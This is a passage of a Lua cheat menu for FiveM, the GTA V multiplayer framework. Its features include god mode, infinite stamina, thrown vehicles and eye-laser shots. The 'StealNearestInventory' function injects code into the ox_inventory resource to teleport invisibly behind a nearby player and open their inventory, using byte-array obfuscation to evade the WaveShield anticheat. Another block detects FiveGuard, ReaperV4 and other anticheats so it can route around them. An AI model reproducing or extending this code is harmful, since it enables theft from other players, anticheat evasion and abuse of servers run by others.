            local player = PlayerPedId()

            if IsPedInAnyVehicle(player, true) then
                Citizen.Wait(100)
                goto continue
            end

            local leftEye = GetPedBoneCoords(player, 25260, 0.0, 0.02, 0.0)
            local rightEye = GetPedBoneCoords(player, 27474, 0.0, 0.02, 0.0)

            local camRot = GetGameplayCamRot(0)
            local camPos = GetGameplayCamCoord()

            local rx = math.rad(camRot.x)
            local rz = math.rad(camRot.z)
            local num = math.abs(math.cos(rx))

            local dirX = -math.sin(rz) * num
            local dirY = math.cos(rz) * num
            local dirZ = math.sin(rx)

            local beamDistance = 500.0
            local targetX = camPos.x + (dirX * beamDistance)
            local targetY = camPos.y + (dirY * beamDistance)
            local targetZ = camPos.z + (dirZ * beamDistance)

            DrawLine(leftEye.x, leftEye.y, leftEye.z,
                    targetX, targetY, targetZ,
                    255, 0, 0, 200)

            DrawLine(rightEye.x, rightEye.y, rightEye.z,
                    targetX, targetY, targetZ,
                    255, 0, 0, 200)

            local shootScript = string.format([[
                local leftEye = GetPedBoneCoords(PlayerPedId(), 25260, 0.0, 0.02, 0.0)
                local rightEye = GetPedBoneCoords(PlayerPedId(), 27474, 0.0, 0.02, 0.0)
                
                local camRot = GetGameplayCamRot(0)
                local camPos = GetGameplayCamCoord()
                
                local rx = math.rad(camRot.x)
                local rz = math.rad(camRot.z)
                local num = math.abs(math.cos(rx))
                
                local dirX = -math.sin(rz) * num
                local dirY = math.cos(rz) * num
                local dirZ = math.sin(rx)
                
                local beamDistance = 500.0
                local targetX = camPos.x + (dirX * beamDistance)
                local targetY = camPos.y + (dirY * beamDistance)
                local targetZ = camPos.z + (dirZ * beamDistance)
                
                ShootSingleBulletBetweenCoords(
                    leftEye.x, leftEye.y, leftEye.z,
                    targetX, targetY, targetZ,
                    100, false,
                    0x5FC3C11, -- WEAPON_SNOWBALL
                    PlayerPedId(), true, false, 2000.0
                )
                ShootSingleBulletBetweenCoords(
                    rightEye.x, rightEye.y, rightEye.z,
                    targetX, targetY, targetZ,
                    100, false,
                    0x5FC3C11, -- WEAPON_SNOWBALL
                    PlayerPedId(), true, false, 2000.0
                )
            ]])

            if Menu.AnticheatDetected.WaveShield or Menu.AnticheatDetected.FiveGuard then
                            if Susano and Susano.InjectResource then
                                pcall(function() Susano.InjectResource("any", shootScript) end)
                else
                    Load(shootScript)()
                end
            else
                ShootSingleBulletBetweenCoords(
                    leftEye.x, leftEye.y, leftEye.z,
                    targetX, targetY, targetZ,
                    100, false,
                    0x5FC3C11, -- WEAPON_SNOWBALL
                    player, true, false, 2000.0
                )
                ShootSingleBulletBetweenCoords(
                    rightEye.x, rightEye.y, rightEye.z,
                    targetX, targetY, targetZ,
                    100, false,
                    0x5FC3C11, -- WEAPON_SNOWBALL
                    player, true, false, 2000.0
                )
            end

            DrawLightWithRange(
                leftEye.x, leftEye.y, leftEye.z,
                255, 0, 0, 2.0, 1.0
            )
            ::continue::
        end
        Citizen.Wait(0)
    end
end)

Menu.SuperJumpEnabled = false

Citizen.CreateThread(function()
    while true do
        if Menu.SuperJumpEnabled then
            local playerId = PlayerId()
            SetSuperJumpThisFrame(playerId)
        end
        Citizen.Wait(0)
    end
end)

Menu.InfiniteStaminaEnabled = false

Citizen.CreateThread(function()
    while true do
        if Menu.InfiniteStaminaEnabled then
            RestorePlayerStamina(PlayerId(), 1.0)
        end
        Citizen.Wait(0)
    end
end)

Menu.RageModeEnabled = false

Citizen.CreateThread(function()
    while true do
        if Menu.RageModeEnabled then
            local ped = PlayerPedId()
            local playerId = PlayerId()

            if GetPlayerWantedLevel(playerId) > 0 then
                SetPlayerWantedLevel(playerId, 0, false)
                SetPlayerWantedLevelNow(playerId, false)
            end

            local health = GetEntityHealth(ped)
            local maxHealth = GetEntityMaxHealth(ped)
            if health < maxHealth then
                SetEntityHealth(ped, math.min(health + 5, maxHealth))
            end

            local armor = GetPedArmour(ped)
            if armor < 100 then
                SetPedArmour(ped, math.min(armor + 2, 100))
            end

            Citizen.Wait(100)
        else
            Citizen.Wait(500)
        end
    end
end)

Menu.FakeLagEnabled = false

Citizen.CreateThread(function()
    while true do
        if Menu.FakeLagEnabled then
            local ped = PlayerPedId()
            local coords = GetEntityCoords(ped)

            local offsetX = math.random(-3, 3) * 1.0
            local offsetY = math.random(-3, 3) * 1.0
            local offsetZ = math.random(0, 2) * 0.5

            SetEntityCoordsNoOffset(ped, coords.x + offsetX, coords.y + offsetY, coords.z + offsetZ, false, false, false)
            Citizen.Wait(math.random(50, 200))

            SetEntityCoordsNoOffset(ped, coords.x, coords.y, coords.z, false, false, false)
            Citizen.Wait(math.random(100, 400))
        else
            Citizen.Wait(500)
        end
    end
end)

Menu.SpinEnabled = false

Citizen.CreateThread(function()
    while true do
        if Menu.SpinEnabled then
            local ped = PlayerPedId()
            local heading = GetEntityHeading(ped)
            SetEntityHeading(ped, heading + 15.0)
            Citizen.Wait(0)
        else
            Citizen.Wait(500)
        end
    end
end)


Menu.ThrowVehiclesEnabled = false
Menu.ThrowVehiclesRunning = false
Menu.ThrowVehiclesThread = nil
Menu.HoldingVehicleEntity = false
Menu.HeldVehicleEntity = nil
Menu.VehicleEntityType = nil

function Menu.VehicleNotify(message)
end

function Menu.DrawVehicleText3D(x, y, z, text)
    local onScreen, _x, _y = World3dToScreen2d(x, y, z)
    if onScreen then
        SetTextScale(0.35, 0.35)
        SetTextFont(4)
        SetTextProportional(1)
        SetTextEntry("STRING")
        SetTextCentre(1)
        AddTextComponentString(text)
        DrawText(_x, _y)
    end
end

function Menu.DrawVehicleInstructions()
    if not Menu.ThrowVehiclesRunning then return end

    local x = 0.5
    local y = 0.77
    local scale = 0.4

    SetTextFont(4)
    SetTextScale(scale, scale)
    SetTextColour(255, 255, 255, 255)
    SetTextDropshadow(0, 0, 0, 0, 255)
    SetTextOutline()
    SetTextCentre(true)
    SetTextEntry("STRING")

    local instructionText = ""
    if not Menu.HoldingVehicleEntity then
        instructionText = "Throw Vehicles: Look at entity (Y to pick up) | F5 to exit"
    else
        instructionText = "Throw Vehicles: Y=Throw | U=Throw+Freeze | K=Drop | L=Delete"
    end

    AddTextComponentString(instructionText)
    DrawText(x, y)
end

function Menu.RotationToDirection(rotation)
    local adjustedRotation = vector3(
        (math.pi / 180) * rotation.x,
        (math.pi / 180) * rotation.y,
        (math.pi / 180) * rotation.z
    )
    local direction = vector3(
        -math.sin(adjustedRotation.z) * math.abs(math.cos(adjustedRotation.x)),
        math.cos(adjustedRotation.z) * math.abs(math.cos(adjustedRotation.x)),
        math.sin(adjustedRotation.x)
    )
    return direction
end


Citizen.CreateThread(function()
    while true do
        if Menu.ThrowVehiclesEnabled then
            local holdingEntity = false
            local holdingCarEntity = false
            local holdingPed = false
            local heldEntity = nil
            local entityType = nil
            local scriptRunning = true

            function notify(message)
            end

            function DrawText3D(x, y, z, text)
                local onScreen, _x, _y = World3dToScreen2d(x, y, z)
                local px, py, pz = table.unpack(GetGameplayCamCoords())
                SetTextScale(0.35, 0.35)
                SetTextFont(4)
                SetTextProportional(1)
                SetTextEntry("STRING")
                SetTextCentre(1)
                AddTextComponentString(text)
                DrawText(_x, _y)
            end

            function DrawInstructions()
                local x = 0.5
                local y = 0.77
                local scale = 0.4
                SetTextFont(4)
                SetTextScale(scale, scale)
                SetTextColour(255, 255, 255, 255)
                SetTextDropshadow(0, 0, 0, 0, 255)
                SetTextOutline()
                SetTextCentre(true)
                SetTextEntry("STRING")

                local instructionText = ""
                if not holdingEntity then
                    instructionText = "Throw Vehicles: Look at entity and press Y to pick up | F5 to exit"
                else
                    instructionText = "Throw Vehicles: Y: Throw | U: Throw & Freeze | K: Drop | L: Delete"
                end

                AddTextComponentString(instructionText)
                DrawText(x, y)
            end

            function RotationToDirection(rotation)
                local adjustedRotation = vec3((math.pi / 180) * rotation.x, (math.pi / 180) * rotation.y, (math.pi / 180) * rotation.z)
                local direction = vec3(-math.sin(adjustedRotation.z) * math.abs(math.cos(adjustedRotation.x)), math.cos(adjustedRotation.z) * math.abs(math.cos(adjustedRotation.x)), math.sin(adjustedRotation.x))
                return direction
            end

            notify("Throw Vehicles started! Look at objects and press Y to pick up.")

            while Menu.ThrowVehiclesEnabled and scriptRunning do
                Wait(0)

                DrawInstructions()

                if IsControlJustReleased(0, 166) then -- F5 key
                    if holdingEntity and heldEntity then
                        local playerPed = PlayerPedId()
                        DetachEntity(heldEntity, true, true)
                        local playerCoords = GetEntityCoords(playerPed)
                        local forwardVector = GetEntityForwardVector(playerPed)
                        local dropPosition = playerCoords + forwardVector * 1.0
                        SetEntityCoords(heldEntity, dropPosition.x, dropPosition.y, dropPosition.z, false, false, false, true)
                        SetEntityHeading(heldEntity, GetEntityHeading(playerPed))
                        FreezeEntityPosition(heldEntity, false)
                        holdingEntity = false
                        holdingCarEntity = false
                        holdingPed = false
                        heldEntity = nil
                        ClearPedTasks(playerPed)
                    end
                    notify("Throw Vehicles terminated.")
                    scriptRunning = false
                    break
                end

                local playerPed = PlayerPedId()
                local playerCoords = GetEntityCoords(playerPed)

                local camPos = GetGameplayCamCoord()
                local camRot = GetGameplayCamRot(2)
                local direction = RotationToDirection(camRot)
                local dest = vec3(camPos.x + direction.x * 10.0, camPos.y + direction.y * 10.0, camPos.z + direction.z * 10.0)

                local rayHandle = StartShapeTestRay(camPos.x, camPos.y, camPos.z, dest.x, dest.y, dest.z, -1, playerPed, 0)
                local _, hit, _, _, entityHit = GetShapeTestResult(rayHandle)
                local validTarget = false

                if hit == 1 then
                    entityType = GetEntityType(entityHit)
                    if entityType == 3 or entityType == 2 or entityType == 1 then
                        validTarget = true
                        local entityText = entityType == 3 and "Object" or (entityType == 2 and "Car" or "Ped")
                        local entityModel = GetEntityModel(entityHit)
                        local accessInfo = ""
                        if entityType == 2 then
                            if NetworkHasControlOfEntity(entityHit) then
                                accessInfo = ", Access: Yes"
                            else
                                accessInfo = ", Access: No"
                                NetworkRequestControlOfEntity(entityHit)
                            end
                        end
                        local entityInfo = "Entity: " .. entityText .. " | Model: " .. entityModel .. accessInfo
                        DrawText3D(playerCoords.x, playerCoords.y, playerCoords.z + 0.5, entityInfo)
                    end
                end

                if IsControlJustReleased(0, 246) then  -- Y key
                    if validTarget and not holdingEntity then
                        if entityHit and (entityType == 3 or entityType == 2 or entityType == 1) then
                            if entityType == 3 then
                                local entityModel = GetEntityModel(entityHit)
                                DeleteEntity(entityHit)
                                RequestModel(entityModel)
                                while not HasModelLoaded(entityModel) do
                                    Wait(100)
                                end
                                local clonedEntity = CreateObject(entityModel, camPos.x, camPos.y, camPos.z, true, true, true)
                                SetModelAsNoLongerNeeded(entityModel)
                                holdingEntity = true
                                heldEntity = clonedEntity
                                FreezeEntityPosition(heldEntity, false)
                                RequestAnimDict("anim@heists@box_carry@")
                                while not HasAnimDictLoaded("anim@heists@box_carry@") do
                                    Wait(100)
                                end
                                TaskPlayAnim(playerPed, "anim@heists@box_carry@", "idle", 8.0, -8.0, -1, 50, 0, false, false, false)
                                AttachEntityToEntity(clonedEntity, playerPed, GetPedBoneIndex(playerPed, 60309), 0.0, 0.2, 0.0, 0.0, 0.0, 0.0, true, true, false, true, 1, true)
                                notify("Object picked up")
                            elseif entityType == 2 then
                                holdingEntity = true
                                holdingCarEntity = true
                                heldEntity = entityHit
                                FreezeEntityPosition(heldEntity, false)
                                RequestAnimDict('anim@mp_rollarcoaster')
                                while not HasAnimDictLoaded('anim@mp_rollarcoaster') do
                                    Wait(100)
                                end
                                TaskPlayAnim(playerPed, 'anim@mp_rollarcoaster', 'hands_up_idle_a_player_one', 8.0, -8.0, -1, 50, 0, false, false, false)
                                AttachEntityToEntity(heldEntity, playerPed, GetPedBoneIndex(playerPed, 60309), 1.0, 0.5, 0.0, 0.0, 0.0, 0.0, true, true, false, false, 1, true)
                                notify("Vehicle picked up")
                            elseif entityType == 1 then
                                holdingEntity = true
                                holdingPed = true
                                heldEntity = entityHit
                                FreezeEntityPosition(heldEntity, false)
                                RequestAnimDict('anim@heists@box_carry@')
                                while not HasAnimDictLoaded('anim@heists@box_carry@') do
                                    Wait(100)
                                end
                                TaskPlayAnim(playerPed, 'anim@heists@box_carry@', 'idle', 8.0, -8.0, -1, 50, 0, false, false, false)
                                local playerCoords = GetEntityCoords(playerPed)
                                local pedCoords = GetEntityCoords(heldEntity)
                                local newPedCoords = vector3(playerCoords.x, playerCoords.y, playerCoords.z - 1)
                                SetEntityCoords(heldEntity, newPedCoords.x, newPedCoords.y, newPedCoords.z, false, false, false, false)
                                ClearPedTasksImmediately(heldEntity)
                                AttachEntityToEntity(heldEntity, playerPed, GetPedBoneIndex(playerPed, 60309), 1.0, 0.5, 0.0, 0.0, 0.0, 0.0, true, true, false, false, 1, true)
                                notify("Ped picked up")
                            end
                        end
                    elseif holdingEntity then
                        local currentEntityType = GetEntityType(heldEntity)
                        local tempHeld = heldEntity
                        holdingEntity = false
                        holdingCarEntity = false
                        holdingPed = false
                        ClearPedTasks(playerPed)
                        DetachEntity(tempHeld, true, true)

                        if currentEntityType == 2 or currentEntityType == 1 then
                            ApplyForceToEntity(tempHeld, 1, direction.x * 1000000, direction.y * 1000000, direction.z * 1000000, 0.0, 0.0, 0.0, 0, false, true, true, false, true)
                            notify("Entity thrown")
                        else
                            local playerCoords = GetEntityCoords(playerPed)
                            local forwardVector = GetEntityForwardVector(playerPed)
                            local dropPosition = playerCoords + forwardVector * 1.0
                            SetEntityCoords(tempHeld, dropPosition.x, dropPosition.y, dropPosition.z, false, false, false, true)
                            SetEntityHeading(tempHeld, GetEntityHeading(playerPed))
                            FreezeEntityPosition(tempHeld, false)
                            notify("Object dropped")
                        end
                        heldEntity = nil
                    end
                end

                if IsControlJustReleased(0, 303) then  -- U key
                    if holdingEntity then
                        local tempHeld = heldEntity
                        holdingEntity = false
                        holdingCarEntity = false
                        holdingPed = false
                        ClearPedTasks(playerPed)
                        DetachEntity(tempHeld, true, true)
                        ApplyForceToEntity(tempHeld, 1, direction.x * 1000000, direction.y * 1000000, direction.z * 1000000, 0.0, 0.0, 0.0, 0, false, true, true, false, true)

                        CreateThread(function()
                            local startTime = GetGameTimer()
                            local timeout = 5000
                            local entityToCheck = tempHeld
                            while GetGameTimer() - startTime < timeout do
                                Wait(100)
                                if HasEntityCollidedWithAnything(entityToCheck) then
                                    FreezeEntityPosition(entityToCheck, true)
                                    notify("Entity thrown and frozen")
                                    return
                                end
                            end
                            FreezeEntityPosition(entityToCheck, true)
                            notify("Entity thrown and frozen (timed out)")
                        end)
                        heldEntity = nil
                    end
                end

                if IsControlJustReleased(0, 182) then  -- L key
                    if holdingEntity then
                        DeleteEntity(heldEntity)
                        holdingEntity = false
                        holdingCarEntity = false
                        holdingPed = false
                        heldEntity = nil
                        ClearPedTasks(playerPed)
                        notify("Entity deleted")
                    end
                end

                if IsControlJustReleased(0, 311) then  -- K key
                    if holdingEntity then
                        local tempHeld = heldEntity
                        holdingEntity = false
                        holdingCarEntity = false
                        holdingPed = false
                        ClearPedTasks(playerPed)
                        local playerCoords = GetEntityCoords(playerPed)
                        local forwardVector = GetEntityForwardVector(playerPed)
                        local dropPosition = playerCoords + forwardVector * 2.0
                        DetachEntity(tempHeld, true, true)
                        SetEntityCoords(tempHeld, dropPosition.x, dropPosition.y, dropPosition.z, false, false, false, true)
                        SetEntityHeading(tempHeld, GetEntityHeading(playerPed))
                        FreezeEntityPosition(tempHeld, false)
                        notify("Entity placed in front")
                        heldEntity = nil
                    end
                end
            end
        end
        Wait(100)
    end
end)

function Menu.StealNearestInventory()
    local playerPed = PlayerPedId()
    local playerCoords = GetEntityCoords(playerPed)
    local closestPlayer = nil
    local closestDistance = 10.0

    for i = 0, 255 do
        if NetworkIsPlayerActive(i) then
            local targetPed = GetPlayerPed(i)
            if targetPed ~= playerPed then
                local targetCoords = GetEntityCoords(targetPed)
                local distance = #(playerCoords - targetCoords)

                if distance < closestDistance then
                    closestPlayer = i
                    closestDistance = distance
                end
            end
        end
    end

    if not closestPlayer then
        return
    end

    local targetServerId = GetPlayerServerId(closestPlayer)


    local WaveDihStarted = GetResourceState("WaveShield") == 'started'

    local injectionScript

    if WaveDihStarted then
        injectionScript = string.format([[
            local function _b(str)
                local t = {}
                for i = 1, #str do t[i] = string.byte(str, i) end
                return t
            end
            local function _d(tbl)
                local s = ""
                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                return s
            end
            local function _g(n)
                local k = _d(n)
                local f = _G[k]
                return f
            end
            local function _w(n)
                return Citizen.Wait(n)
            end

            local function findClientIdByServerId(sid)
                local players = _g(_b("GetActivePlayers"))()
                for _, pid in ipairs(players) do
                    if _g(_b("GetPlayerServerId"))(pid) == sid then
                        return pid
                    end
                end
                return nil
            end

            local function getSafeNearbyCoord(entity)
                local behind = _g(_b("GetOffsetFromEntityInWorldCoords"))(entity, 0.0, -1.75, 0.0)
                local found, gz = _g(_b("GetGroundZFor_3dCoord"))(behind.x, behind.y, behind.z + 5.0, false)
                if found then behind = vec3(behind.x, behind.y, gz + 0.1) end
                return behind
            end

            local function stealthTeleportToEntity(entity)
                if not entity or not _g(_b("DoesEntityExist"))(entity) then return nil end
                local me = _g(_b("PlayerPedId"))()
                local originalPos = _g(_b("GetEntityCoords"))(me)
                local wasVisible = _g(_b("IsEntityVisible"))(me)
                _g(_b("SetEntityVisible"))(me, false, false)
                _g(_b("SetEntityInvincible"))(me, true)
                _g(_b("SetEntityCollision"))(me, false, false)
                _g(_b("FreezeEntityPosition"))(me, true)
                _w(0)
                local dest = getSafeNearbyCoord(entity)
                if _g(_b("IsPedInAnyVehicle"))(me, false) then
                    local veh = _g(_b("GetVehiclePedIsIn"))(me, false)
                    if veh and veh ~= 0 then
                        _g(_b("SetEntityCoordsNoOffset"))(veh, dest.x, dest.y, dest.z, true, true, true)
                    else
                        _g(_b("SetEntityCoordsNoOffset"))(me, dest.x, dest.y, dest.z, true, true, true)
                    end
                else
                    _g(_b("SetEntityCoordsNoOffset"))(me, dest.x, dest.y, dest.z, true, true, true)
                end
                _w(50)
                _g(_b("FreezeEntityPosition"))(me, false)
                _g(_b("SetEntityCollision"))(me, true, true)
                _g(_b("SetEntityInvincible"))(me, false)
                _g(_b("SetEntityVisible"))(me, wasVisible, false)
                return originalPos
            end

            local function restoreOriginalPosition(entity, originalPos)
                if not originalPos then return end
                _g(_b("FreezeEntityPosition"))(entity, true)
                if _g(_b("IsPedInAnyVehicle"))(entity, false) then
                    local veh = _g(_b("GetVehiclePedIsIn"))(entity, false)
                    if veh and veh ~= 0 then
                        _g(_b("SetEntityCoordsNoOffset"))(veh, originalPos.x, originalPos.y, originalPos.z, true, true, true)
                    else
                        _g(_b("SetEntityCoordsNoOffset"))(entity, originalPos.x, originalPos.y, originalPos.z, true, true, true)
                    end
                else
                    _g(_b("SetEntityCoordsNoOffset"))(entity, originalPos.x, originalPos.y, originalPos.z, true, true, true)
                end
                _w(50)
                _g(_b("FreezeEntityPosition"))(entity, false)
            end

            local function forceHandsUp(entity)
                local animDict, animName = "missminuteman_1ig_2", "handsup_base"
                _g(_b("RequestAnimDict"))(animDict)
                while not _g(_b("HasAnimDictLoaded"))(animDict) do _w(10) end
                _g(_b("TaskPlayAnim"))(entity, animDict, animName, 8.0, -8.0, -1, 49, 0, false, false, false)
            end

            local co = coroutine.create(function()
                _w(100)
                local targetServerId = %d
                local clientId = findClientIdByServerId(targetServerId)
                local targetPed = clientId and _g(_b("GetPlayerPed"))(clientId) or nil
                if targetPed and _g(_b("DoesEntityExist"))(targetPed) then
                    local me = _g(_b("PlayerPedId"))()
                    local originalPos = stealthTeleportToEntity(targetPed)
                    _w(100)
                    forceHandsUp(targetPed)
                    _g(_b("TriggerEvent"))("ox_inventory:openInventory", "otherplayer", _g(_b("GetPlayerServerId"))(clientId))
                    _w(100)
                    restoreOriginalPosition(me, originalPos)
                end
            end)
            while coroutine.status(co) ~= "dead" do
                local ok, err = coroutine.resume(co)
                if not ok then break end
                _w(0)
            end
        ]], targetServerId)
    else
        injectionScript = string.format([[
            local function findClientIdByServerId(sid)
                local players = GetActivePlayers()
                for _, pid in ipairs(players) do
                    if GetPlayerServerId(pid) == sid then
                        return pid
                    end
                end
                return nil
            end

            local function getSafeNearbyCoord(entity)
                local behind = GetOffsetFromEntityInWorldCoords(entity, 0.0, -1.75, 0.0)
                local found, gz = GetGroundZFor_3dCoord(behind.x, behind.y, behind.z + 5.0, false)
                if found then behind = vec3(behind.x, behind.y, gz + 0.1) end
                return behind
            end

            local function stealthTeleportToEntity(entity)
                if not entity or not DoesEntityExist(entity) then return nil end
                local me = PlayerPedId()
                local originalPos = GetEntityCoords(me)
                local wasVisible = IsEntityVisible(me)
                SetEntityVisible(me, false, false)
                SetEntityInvincible(me, true)
                SetEntityCollision(me, false, false)
                FreezeEntityPosition(me, true)
                Citizen.Wait(0)
                local dest = getSafeNearbyCoord(entity)
                if IsPedInAnyVehicle(me, false) then
                    local veh = GetVehiclePedIsIn(me, false)
                    if veh and veh ~= 0 then
                        SetEntityCoordsNoOffset(veh, dest.x, dest.y, dest.z, true, true, true)
                    else
                        SetEntityCoordsNoOffset(me, dest.x, dest.y, dest.z, true, true, true)
                    end
                else
                    SetEntityCoordsNoOffset(me, dest.x, dest.y, dest.z, true, true, true)
                end
                Citizen.Wait(50)
                FreezeEntityPosition(me, false)
                SetEntityCollision(me, true, true)
                SetEntityInvincible(me, false)
                SetEntityVisible(me, wasVisible, false)
                return originalPos
            end

            local function restoreOriginalPosition(entity, originalPos)
                if not originalPos then return end
                FreezeEntityPosition(entity, true)
                if IsPedInAnyVehicle(entity, false) then
                    local veh = GetVehiclePedIsIn(entity, false)
                    if veh and veh ~= 0 then
                        SetEntityCoordsNoOffset(veh, originalPos.x, originalPos.y, originalPos.z, true, true, true)
                    else
                        SetEntityCoordsNoOffset(entity, originalPos.x, originalPos.y, originalPos.z, true, true, true)
                    end
                else
                    SetEntityCoordsNoOffset(entity, originalPos.x, originalPos.y, originalPos.z, true, true, true)
                end
                Citizen.Wait(50)
                FreezeEntityPosition(entity, false)
            end

            local function forceHandsUp(entity)
                local animDict, animName = "missminuteman_1ig_2", "handsup_base"
                RequestAnimDict(animDict)
                while not HasAnimDictLoaded(animDict) do Citizen.Wait(10) end
                TaskPlayAnim(entity, animDict, animName, 8.0, -8.0, -1, 49, 0, false, false, false)
            end

            local targetServerId = %d
            local clientId = findClientIdByServerId(targetServerId)
            local targetPed = clientId and GetPlayerPed(clientId) or nil
            if targetPed and DoesEntityExist(targetPed) then
                local me = PlayerPedId()
                local originalPos = stealthTeleportToEntity(targetPed)
                Citizen.Wait(100)
                forceHandsUp(targetPed)
                TriggerEvent("ox_inventory:openInventory", "otherplayer", GetPlayerServerId(clientId))
                Citizen.Wait(100)
                restoreOriginalPosition(me, originalPos)
            end
        ]], targetServerId)
    end

    if Susano and Susano.InjectResource then
        Susano.InjectResource("ox_inventory", injectionScript)
    end
end

Menu.AnticheatDetected = {
    WaveShield = GetResourceState("WaveShield") == 'started',
    FiveGuard = false,  -- Will check via native
    ReaperV4 = false,   -- Will check via native
    FiniAC = false,     -- Will check below
    ElectronAC = false, -- Will check below
    VMenu = GetResourceState("VMenu") == 'started',
    EasyAdmin = GetResourceState("EasyAdmin") == 'started'
}

if GetResourceState then
    Menu.AnticheatDetected.FiveGuard = (GetResourceState("FiveGuard") == 'started') or
                                       (type(FiveGuard) == "table")
    Menu.AnticheatDetected.ReaperV4 = (GetResourceState("ReaperV4") == 'started') or
                                      (type(Reaper) == "table")
    for i = 0, GetNumResources() - 1 do
        local res = GetResourceByFindIndex(i)
        if res and GetResourceState(res) == "started" then
            local low = string.lower(res)
            if string.find(low, "fini") or string.find(low, "finiac") then
                Menu.AnticheatDetected.FiniAC = true
            end
            if string.find(low, "electron") or string.find(low, "eac") then
                Menu.AnticheatDetected.ElectronAC = true
            end
        end
    end
end




Citizen.CreateThread(function()
    Citizen.Wait(3000)

    local activeAC = {}
    for acName, isActive in pairs(Menu.AnticheatDetected) do
        if isActive then table.insert(activeAC, acName) end
    end

    if #activeAC > 0 then
    else
    end
end)

Menu.GodModeEnabled = false
Menu.GodModeThread = nil

function Menu.MaintainGodMode()
    if Menu.GodModeThread then return end
    
    Menu.GodModeThread = Citizen.CreateThread(function()
        while Menu.GodModeEnabled do
            Menu.SafeExec([[
                local playerPed = PlayerPedId()
                if GetEntityHealth(playerPed) < GetEntityMaxHealth(playerPed) then
                    SetEntityHealth(playerPed, GetEntityMaxHealth(playerPed))
                end
                if GetPedArmour(playerPed) < 100 then
                    SetPedArmour(playerPed, 100)
                end
                SetEntityInvincible(playerPed, true)
                SetEntityOnlyDamagedByPlayer(playerPed, false)
                SetEntityCanBeDamaged(playerPed, false)
            ]])
            Citizen.Wait(1000)
        end
        
        Menu.SafeExec([[
            local playerPed = PlayerPedId()
            SetEntityInvincible(playerPed, false)
            SetEntityCanBeDamaged(playerPed, true)
            SetEntityOnlyDamagedByPlayer(playerPed, true)
        ]])
        
        Menu.GodModeThread = nil
    end)
end

function Menu.EnableGodMode(state)
    Menu.GodModeEnabled = state
    
    if state then
        Menu.SafeExec([[
            local playerPed = PlayerPedId()
            SetEntityInvincible(playerPed, true)
            SetEntityOnlyDamagedByPlayer(playerPed, false)
            SetEntityCanBeDamaged(playerPed, false)
            SetEntityHealth(playerPed, GetEntityMaxHealth(playerPed))
            SetPedArmour(playerPed, 100)
            SetPedCanRagdoll(playerPed, false)
            SetPedCanBeKnockedOffVehicle(playerPed, false)
            SetPedCanBeDraggedOut(playerPed, false)
            SetPedSuffersCriticalHits(playerPed, false)
        ]])
        Menu.MaintainGodMode()
    else
        Menu.SafeExec([[
            local playerPed = PlayerPedId()
            SetEntityInvincible(playerPed, false)
            SetEntityCanBeDamaged(playerPed, true)
            SetEntityOnlyDamagedByPlayer(playerPed, true)
            SetPedCanRagdoll(playerPed, true)
            SetPedCanBeKnockedOffVehicle(playerPed, true)
            SetPedCanBeDraggedOut(playerPed, true)
            SetPedSuffersCriticalHits(playerPed, true)
        ]])
    end
end

Citizen.CreateThread(function()
    while true do
        Citizen.Wait(0)
        local ped = PlayerPedId()
        if IsPedInAnyVehicle(ped, false) then
            local veh = GetVehiclePedIsIn(ped, false)
            if Menu.HornBoostEnabled and IsControlPressed(0, 86) then
                local speed = GetEntitySpeed(veh)
                if speed > 1.0 then
                    local h = GetEntityHeading(veh)
                    local rad = h * math.pi / 180.0
                    local force = 1.5
                    ApplyForceToEntity(veh, 1, 0.0, force, 0.0, 0.0, 0.0, 0.0, 0, true, true, true, false, true)
                end
            end
            if Menu.EngineAlwaysOn then
                Menu.SafeExec(string.format([[SetVehicleEngineOn(NetToVeh(%d), true, true, false)]], VehToNet(veh)))
            end
        end
    end
end)

Menu.StartCustomLoading(3500, function()
    -- Finish startup loading
end, "welcome")

return Menu
